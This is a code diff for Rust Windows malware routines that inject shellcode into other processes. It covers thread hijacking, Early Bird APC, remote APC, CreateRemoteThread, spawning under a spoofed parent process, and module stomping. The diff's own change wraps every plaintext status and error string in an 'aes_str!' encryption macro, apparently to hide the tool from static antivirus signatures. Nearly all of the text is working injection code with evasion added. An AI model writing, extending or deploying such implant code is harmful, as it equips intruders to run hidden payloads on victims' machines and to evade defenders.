@@ -24,7 +24,7 @@ fn ffi() -> &'static crate::config::FfiWindowsConfig {
 // 1. Remote Hijack (Aggressive)
 pub unsafe fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String, String> {
     let h_process = OpenProcess(ffi().process_all_access, 0, pid);
-    if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }
+    if h_process.is_null() { return Err(format!("{}: {}", aes_str!("OpenProcess Error"), GetLastError())); }
 
     let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     if addr.is_null() { CloseHandle(h_process); return Err(aes_str!("Alloc failed")); }
@@ -63,7 +63,7 @@ pub unsafe fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String,
 
     CloseHandle(h_thread);
     CloseHandle(h_process);
-    Ok(format!("Hijacked Thread ID {}", target_tid))
+    Ok(format!("{} {}", aes_str!("Hijacked Thread ID"), target_tid))
 }
 
 // 2. Early Bird (Stealthy)
@@ -73,7 +73,7 @@ pub unsafe fn inject_early_bird(binary: &str, shellcode: &[u8]) -> Result<String
     let mut pi: PROCESS_INFORMATION = mem::zeroed();
 
     if CreateProcessA(app_name.as_ptr() as *mut _, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, ffi().create_suspended, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) == 0 {
-        return Err(format!("CreateProcess failed: {}", GetLastError()));
+        return Err(format!("{}: {}", aes_str!("CreateProcess failed"), GetLastError()));
     }
 
     let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
@@ -88,13 +88,13 @@ pub unsafe fn inject_early_bird(binary: &str, shellcode: &[u8]) -> Result<String
     let pid = pi.dw_process_id;
     CloseHandle(pi.h_thread);
     CloseHandle(pi.h_process);
-    Ok(format!("Early Bird Success! Spawned PID: {}", pid))
+    Ok(format!("{}: {}", aes_str!("Early Bird Success! Spawned PID"), pid))
 }
 
 // 3. Remote APC
 pub unsafe fn inject_remote_apc(pid: u32, shellcode: &[u8]) -> Result<String, String> {
     let h_process = OpenProcess(ffi().process_all_access, 0, pid);
-    if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }
+    if h_process.is_null() { return Err(format!("{}: {}", aes_str!("OpenProcess Error"), GetLastError())); }
 
     let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     let mut written = 0;
@@ -127,7 +127,7 @@ pub unsafe fn inject_remote_apc(pid: u32, shellcode: &[u8]) -> Result<String, St
 // 4. Classic Remote Thread (Stable)
 pub unsafe fn inject_remote_create_thread(pid: u32, shellcode: &[u8]) -> Result<String, String> {
     let h_process = OpenProcess(ffi().process_all_access, 0, pid);
-    if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }
+    if h_process.is_null() { return Err(format!("{}: {}", aes_str!("OpenProcess Error"), GetLastError())); }
 
     let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     if addr.is_null() { CloseHandle(h_process); return Err(aes_str!("Alloc failed")); }
@@ -143,7 +143,7 @@ pub unsafe fn inject_remote_create_thread(pid: u32, shellcode: &[u8]) -> Result<
 
     if h_thread.is_null() {
         CloseHandle(h_process);
-        return Err(format!("CreateRemoteThread Failed: {}", GetLastError()));
+        return Err(format!("{}: {}", aes_str!("CreateRemoteThread Failed"), GetLastError()));
     }
     
     WaitForSingleObject(h_thread, 200);
@@ -151,7 +151,7 @@ pub unsafe fn inject_remote_create_thread(pid: u32, shellcode: &[u8]) -> Result<
     CloseHandle(h_thread);
     CloseHandle(h_process);
 
-    Ok(format!("Created Remote Thread ID {}", tid))
+    Ok(format!("{} {}", aes_str!("Created Remote Thread ID"), tid))
 }
 
 // 5. Self Injection
@@ -222,13 +222,13 @@ pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[
     DeleteProcThreadAttributeList(lp_attr_list);
     CloseHandle(h_parent);
 
-    if success == 0 { return Err(format!("CreateProcess failed: {}", GetLastError())); }
+    if success == 0 { return Err(format!("{}: {}", aes_str!("CreateProcess failed"), GetLastError())); }
 
     // F. Injection via Standard API (Stable)
     let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), ffi().mem_commit | ffi().mem_reserve, ffi().page_readwrite);
     if addr.is_null() {
         let _ = CloseHandle(pi.h_process);
-        return Err(format!("Alloc failed: {}", GetLastError()));
+        return Err(format!("{}: {}", aes_str!("Alloc failed"), GetLastError()));
     }
 
     let mut written = 0;
@@ -244,7 +244,7 @@ pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[
     CloseHandle(pi.h_thread);
     CloseHandle(pi.h_process);
 
-    Ok(format!("Advanced Spawn Success! PID: {} (Parent: {})", new_pid, parent_pid))
+    Ok(format!("{}: {} ({}: {})", aes_str!("Advanced Spawn Success! PID"), new_pid, aes_str!("Parent"), parent_pid))
 }
 
 // 7. Module Stomping (Manual/Specific)
@@ -283,7 +283,7 @@ pub unsafe fn inject_module_stomping(pid: u32, dll_name: &str, shellcode: &[u8])
     CreateRemoteThread(h_process, ptr::null_mut(), 0, addr, ptr::null_mut(), 0, &mut tid);
 
     CloseHandle(h_process);
-    Ok(format!("Module Stomped (Manual) in PID {}", pid))
+    Ok(format!("{} {}", aes_str!("Module Stomped (Manual) in PID"), pid))
 }
 
 // 8. Module Stomping (Auto-Discovery)
@@ -320,7 +320,7 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
         let name_lower = name.to_lowercase();
 
         // [CRITICAL FIX] Blacklist Dangerous/System DLLs
-        if name_lower.ends_with(".exe") || 
+        if name_lower.ends_with(aes_str!(".exe").as_str()) || 
            name_lower == aes_str!("ntdll.dll") || 
            name_lower == aes_str!("kernel32.dll") || 
            name_lower == aes_str!("kernelbase.dll") {
@@ -364,7 +364,7 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
 
             let name_raw = &headers[offset..offset + 8];
             if let Ok(sec_name) = std::str::from_utf8(name_raw) {
-                if sec_name.trim_matches(char::from(0)) == ".text" {
+                if sec_name.trim_matches(char::from(0)) == aes_str!(".text").as_str() {
                     let virtual_size = u32::from_le_bytes([
                         headers[offset + 8], headers[offset + 9], headers[offset + 10], headers[offset + 11]
                     ]) as usize;
@@ -410,7 +410,7 @@ pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<
 
         CloseHandle(h_thread);
         CloseHandle(h_process);
-        return Ok(format!("[+] Auto-stomped module '{}' at .text (thread ID: {})", mod_name, tid));
+        return Ok(format!("{} '{}' {} ({}: {})", aes_str!("[+] Auto-stomped module"), mod_name, aes_str!("at .text"), aes_str!("thread ID"), tid));
     }
 
     CloseHandle(h_process);
